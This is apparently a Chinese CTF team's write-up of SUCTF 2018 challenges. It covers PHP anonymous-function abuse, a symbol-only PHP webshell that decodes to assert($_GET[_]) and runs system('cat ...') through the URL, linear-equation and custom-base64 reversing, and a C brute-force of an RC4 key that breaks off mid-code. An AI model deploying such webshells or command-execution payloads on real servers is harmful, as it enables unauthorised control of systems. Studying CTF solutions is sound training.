SUCTF - 天枢 - 20180528
===

# Web

## Anonymous

尝试执行匿名函数

``` python
import requests
for i in range(255):
     a = requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_'+str(i))
     try:
             print (a.content)
     except:
             continue
             
#SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}
```


## Getshell

遍历所有 `string.printable` 字符后，发现只允许 `$_~.()[];` ，于是构造只含有这些标点符号字符的 webshell 即可。  

``` php
<?php
$_=(~%9E).(~%8C).(~%8C).(~%9A).(~%8D).(~%8B);$__=(~%A0).(~%B8).(~%BA).(~%AB);$___=$$__;$_($___[_]);

// assert($_GET[_]);
// 
// http://web.suctf.asuri.org:82/upload/39d6220c7c3f8a26a7b997c1d56dbfa5.php?_=system(%27cat%20/Th1s_14_f14g%27);
// SUCTF{KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o}
```

# reverse

## simpleformat

输入36个char，每两个为一组，共18个变量。
方程组由由18个dprintf表示。
提取其系数矩阵与结果向量，由numpy求解可得flag
```python=
from numpy import *

target = [0x535908,0x42528a,0x59e457,0x685e38,0x78bd81,0x6b923e,0x71c428,0x6f90fc,0x601e78,0x6c8d74,0x6b6073,0x68dfdb,0x5621fa,0x7a4975,0x6225d7,0x654b72,0x6a3321,0x6652dc]
eq = ['']*18
eq[0] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+5+5+5+5+5+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[1] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+7+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+19'
eq[2] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[3] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+16+16+16+16+16+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[4] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[5] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[6] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19'
eq[7] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[8] = '2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+17+17+18+19+19+19+19+19+19+19+19+19+19+19'
eq[9] = '2+2+2+2+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[10] = '2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+8+8+8+8+8+8+8+8+8+8+8+8+8+8+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[11] = '3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[12] = '2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+5+5+5+5+6+6+6+6+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[13] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19'
eq[14] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+5+5+5+5+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+9+9+9+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[15] = '2+2+2+2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'
eq[16] = '2+2+2+2+2+2+2+2+2+2+2+2+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+4+4+4+4+5+5+5+5+5+5+5+5+6+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19'
eq[17] = '2+2+2+2+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+3+4+4+4+4+4+4+4+4+4+4+4+5+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+6+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+7+8+8+8+8+8+8+8+8+8+8+8+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+10+11+11+11+11+11+11+11+11+11+11+11+11+11+11+11+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+12+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+13+14+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+15+16+16+16+16+16+16+16+16+16+17+17+17+17+17+17+17+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+18+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19+19'

def processEql(eq):
    eq = eq.split('+')
    ans = ''
    for i in range(2,20):
        ans += "%2d "%eq.count(str(i))

    return ans

ans = ''
for i in range(18):
    ans += processEql(eq[i])
    ans += ';'
ans = ans[:-1]
A = mat(ans)

b = array(target)
x = linalg.solve(A,b)
# print x
# for i in x:
    # print i,int(i+0.1)
x = [21843, 21571, 31558, 12659, 28781, 13164, 28767, 26994, 14190, 24422,12652, 25966, 29281, 26207, 29232, 30061, 24940, 32115]
ans = ''
for i in x:
    a = int(i)
    ans += hex(a)[2:].decode('hex')[::-1] 
    # print hex(a)[2:].decode('hex')[::-1],
print ans
```
flag : `SUCTF{s1mpl3_prin7f_l1near_f0rmulas}` 


## babyre

mips题目，简单的base64变形解码，替换了base64置换表
```python=
#!/usr/bin/env python2
#-*- coding:utf-8 -*-

base64list = 'R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/0Dg5zXAFqQfxBicV3m8U'
cipherlist = "eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m"

length=len(cipherlist)
print length
group=length/4
s=''
string=''


for i in range(group-1):
	j=i*4
	s=cipherlist[j:j+4]
	string+=chr(((base64list.index(s[0]))<<2)+((base64list.index(s[1]))>>4))
	string+=chr(((base64list.index(s[1]) & 0x0f)<<4)+((base64list.index(s[2]))>>2))
	string+=chr(((base64list.index(s[2]) & 0x03)<<6)+((base64list.index(s[3]))))
j=(group-1)*4
s=cipherlist[j:j+4]
string+=chr(((base64list.index(s[0]))<<2)+((base64list.index(s[1]))>>4))
if s[2]=='=':
	print string
else:
	string+=chr(((base64list.index(s[1]) & 0x0f)<<4)+((base64list.index(s[2]))>>2))
if s[3]=='=':
	print string
else:
	string+=chr(((base64list.index(s[2]) & 0x03)<<6)+((base64list.index(s[3]))))
	print string
    
#SUCTF{wh0_1s_y0ur_d4ddy}
```

## python大法

题目给了一个so，给了一个解析pyc完成以后的文本，so库里是rc4算法，但是缺少密钥key,通过查阅python2.7 opcode，手动翻译opcode为汇编如下：

```bash
1层
640000 LOAD_CONST 0
640100 LOAD_CONST 1
6c0000 IMPORT_NAME 0 ctypes
54 IMPORT_STAR
640000 LOAD_CONST 0
640200 LOAD_CONST 2
6c0100 IMPORT_NAME 1 libnum
6d0200 IMPORT_FROM 2 n2s
5a0200 STORE_NAME 2
6d0300 IMPORT_FROM 3 s2n
5a0300 STORE_NAME 3
01 POP_TOP
640000 LOAD_CONST 0
640300 LOAD_CONST 3
6c0400 IMPORT_NAME 4 binascii
5a0500 STORE_NAME 5 b
640400 LOAD_CONST 4
5a0600 STORE_NAME 6 key
640500 LOAD_CONST 5
840000 MAKE_FUNCTION aaaa
5a0700 STORE_NAME 7
640600 LOAD_CONST 6
840000 MAKE_FUNCTION aa
5a0800 STORE_NAME 8
640700 LOAD_CONST 7
840000 MAKE_FUNCTION aaaaa
5a0900 STORE_NAME 9
640800 LOAD_CONST 8
840000 MAKE_FUNCTION aaa
5a0a00 STORE_NAME 10
640900 LOAD_CONST 9
840000 MAKE_FUNCTION aaaaaa
5a0b00 STORE_NAME 11
650c00 LOAD_NAME 12 __name__
640a00 LOAD_CONST 10
6b0200 COMPARE_OP 2
727500 POP_JUMP_IF_FALSE
650b00 LOAD_NAME 11
830000 CALL_FUNCTION
01 POP_TOP
6e0000 JUMP_FORWARD
640300 LOAD_CONST 3


2层
640100 LOAD_CONST 1
840000 MAKE_FUNCTION
890000 STORE_DEREF
640200 LOAD_CONST 2
6a0000 LOAD_ATTR
870000 LOAD_CLOSURE
660100 BUILD_TUPLE 1
640300 LOAD_CONST 3
860000 MAKE_CLOSURE
7c0000 LOAD_FAST 0
44 GET_ITER
830100 CALL_FUNCTION 1
830100 CALL_FUNCTION 1
53 RETURN_VALUE


3层
740000 LOAD_GLOBAL 0
6a0100 LOAD_ATTR 1
7c0000 LOAD_FAST 0
830100 CALL_FUNCTION 1
53 RETURN_VALUE


3层
7c0000 LOAD_FAST 0
5d1100 FOR_ITER 17 0-17
7d0100 STORE_FAST 1
880000 LOAD_DEREF
7c0100 LOAD_FAST 1
830100 CALL_FUNCTION 1
56 YIELD_VALUE
01 POP_TOP
710300 JUMP_ABSOLUTE 3
640000 LOAD_CONST 0
53 RETURN_VALUE


2层
740000 LOAD_GLOBAL 0
6a0100 LOAD_ATTR 1
640100 LOAD_CONST 1
830100 CALL_FUNCTION 1
6a0200 LOAD_ATTR 2
7d0100 STORE_FAST 1
7c0100 LOAD_FAST 1
7c0000 LOAD_FAST 0
830100 CALL_FUNCTION 1
01 POP_TOP
640000 LOAD_CONST 0
53 RETURN_VALUE


2层
740000 LAOD_GLOBAL 0
7c0000 LOAD_FAST 0
830100 CALL_FUNCTION 1
53 RETURN_VALUE


2层
740000 LAOD_GLOBAL 0
6a0100 LOAD_ATTR 1
640100 LOAD_CONST 1
830100 CALL_FUNCTION 1
6a0200 LOAD_ATTR 2
7d0100 STORE_FAST 1
7c0100 LOAD_FAST 1
7c0000 LOAD_FAST 0
830100 CALL_FUNCTION 1
01 POP_TOP
640000 LOAD_CONST
53 RETURN_VALUE


2层
740000 LAOD_GLOBAL 0
740100 LOAD_GLOBAL 1
740200 LOAD_GLOBAL 2
830100 CALL_FUNCTION 1
830100 CALL_FUNCTION 1
01 POP_TOP
640000 LOAD_CONST
53 RETURN_VALUE
```

分析以上汇编，能大致了解该pyc的意思，如下python脚本(该python脚本仅作理解，不能运行，作用同草稿)：
```python
#!/usr/bin/env python2
import ctypes
from libnum import n2s,s2n
import binascii

#推测函数作用为将字符串转换为16进制值


key = ''

def aaaa(key): #one parameter one lovalVar hexlify ascii to hexstr #18个满足某个条件
	hexlify(key) #hexlify
			#genexpr
def aa(key):#传入key进入so的rc4进行运算
	LoadLibrary(a).a(key)

def aaaaa(key):#s2n函数将ascii转换为十六进制
	s2n(key)
def aaa(key):#功能似乎和aa相同
	cdll=LoadLibrary(a).aa
	cdll(key)
def aaaaaa():
	aaa(aaaa(key))

if __name__ == "__main__":
	aaaaaa()
```

作用就是将我们的8位密钥，8位见汇编中const中的"********"，输入so中进行计算，由于爆破八位密钥，复杂度太高，猜测为数字或者单纯的大写，小写字母，先用纯数字爆破，得到flag:
```cpp
char table[] = "0123456789";
void rc4_init(unsigned char* IV, unsigned char* Key, int Len)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i<256; i++)
	{
		IV[i] = i;
		k[i] = Key[i%Len];
	}
	for (i = 0; i<256; i++)
	{
		j = (j + IV[i] + k[i]) % 256;
		tmp = IV[i];
		IV[i] = IV[j];
		IV[j] = tmp;
	}
}

char* rc4_crypt(unsigned char* IV, unsigned char* Data, int Len)
{
	char answer[37] = { 0, };
	int i = 0, j = 0, t = 0;
	long k = 0;
	unsigned char tmp;
	for (k = 0; k<Len; k++)
	{
		i = (i + 1) % 256;
		j = (j + IV[i]) % 256;
		tmp = IV[i];
		IV[i] = IV[j];
		IV[j] = tmp;
		t = (IV[i] + IV[j]) % 256;
		Data[k] ^= IV[t];
		//printf("%c", Data[k]);
		answer[k] = Data[k];
	}
	//printf("\n");
	return answer;
}

int main()
{
	char *answer;
	int tableLen = strlen(table);
	char Key[9] = { 0, };
	for (int x1 = 0; x1 < tableLen; x1++)
	{
		Key[0] = table[x1];
		for (int x2 = 0; x2 < tableLen; x2++)
		{
			Key[1] = table[x2];
			for (int x3 = 0; x3 < tableLen; x3++)
			{
				Key[2] = table[x3];
				for (int x4 = 0; x4 < tableLen; x4++)
				{
					Key[3] = table[x4];
					for (int x5 = 0; x5 < tableLen; x5++)
					{
						Key[4] = table[x5];
						for (int x6 = 0; x6 < tableLen; x6++)
						{
							Key[5] = table[x6];
							for (int x7 = 0; x7 < tableLen; x7++)
							{
								Key[6] = table[x7];
								for (int x8 = 0; x8 < tableLen; x8++)
								{
									Key[7] = table[x8];
									unsigned char cipher[] = { 0x66,0x15,0x64,0x2C,0x43,0x09,0x62,0x16,0xE9,0x2C,0xB6,0x46,0xFB,0x5D,0xD1,0x25,0x8A,0xE3,0xD9,0x38,0x92,0x1B,0x3B,0x06,0x5C,0x1A,0x9D,0x4E,0xAC,0x8F,0x98,0x21,0x62,0xAF,0xD5,0xE7 };

									char iv[256] = { 0, };
									rc4_init((unsigned char *)iv, (unsigned char *)Key, 8);
